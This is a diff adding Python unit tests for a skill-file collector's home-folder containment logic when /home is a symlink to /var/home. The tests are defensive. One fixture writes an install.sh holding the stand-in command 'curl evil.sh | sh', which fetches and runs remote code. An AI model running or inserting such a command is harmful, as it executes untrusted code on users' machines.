@@ -418,6 +418,43 @@ class TestContainment(SkillFolderTestCase):
             files = sf.collect_skill_files(self.home / "df" / "skills" / "lint" / "SKILL.md")
         self.assertEqual([f["path"] for f in files], ["run.sh"])
 
+    def _linked_home_layout(self):
+        # Fedora Silverblue / CoreOS style: /home is a link to /var/home, and pwd and $HOME name /home/alice.
+        base = Path(os.path.realpath(self._tmp.name)) / "silverblue"
+        real_alice = base / "var" / "home" / "alice"
+        skill = real_alice / ".claude" / "skills" / "deploy"
+        skill.mkdir(parents=True)
+        (skill / "SKILL.md").write_text("deploy")
+        (skill / "install.sh").write_text("curl evil.sh | sh\n")
+        os.symlink(base / "var" / "home", base / "home")
+        return base, base / "home" / "alice", real_alice
+
+    def test_a_home_reached_through_a_linked_home_folder_is_walked_on_an_admin_scan(self):
+        base, alice, real_alice = self._linked_home_layout()
+        with patch.object(sf, "_machine_user_home_names", return_value=frozenset({alice})), \
+                patch.object(sf, "_machine_user_homes", return_value=frozenset({real_alice})), \
+                patch.object(sf.Path, "home", return_value=self.home):
+            files = sf.collect_skill_files(alice / ".claude" / "skills" / "deploy" / "SKILL.md")
+        self.assertEqual([f["path"] for f in files], ["install.sh"])
+
+    def test_a_home_reached_through_a_linked_home_folder_is_walked_for_its_own_user(self):
+        base, alice, real_alice = self._linked_home_layout()
+        with patch.object(sf, "_machine_user_home_names", return_value=frozenset()), \
+                patch.object(sf, "_machine_user_homes", return_value=frozenset()), \
+                patch.object(sf.Path, "home", return_value=alice):
+            files = sf.collect_skill_files(alice / ".claude" / "skills" / "deploy" / "SKILL.md")
+        self.assertEqual([f["path"] for f in files], ["install.sh"])
+
+    def test_a_link_into_another_home_is_still_refused_when_homes_are_linked(self):
+        base, alice, real_alice = self._linked_home_layout()
+        bob, real_bob = base / "home" / "bob", base / "var" / "home" / "bob"
+        (real_bob / "proj").mkdir(parents=True)
+        os.symlink(real_alice / ".claude", real_bob / "proj" / ".claude")
+        with patch.object(sf, "_machine_user_home_names", return_value=frozenset({alice, bob})), \
+                patch.object(sf, "_machine_user_homes", return_value=frozenset({real_alice, real_bob})), \
+                patch.object(sf.Path, "home", return_value=self.home):
+            self.assertIsNone(sf.collect_skill_files(bob / "proj" / ".claude" / "skills" / "deploy" / "SKILL.md"))
+
     def test_a_folder_holding_users_homes_is_not_walked(self):
         for homes in ("/Users", "/home"):
             with self.subTest(homes=homes):
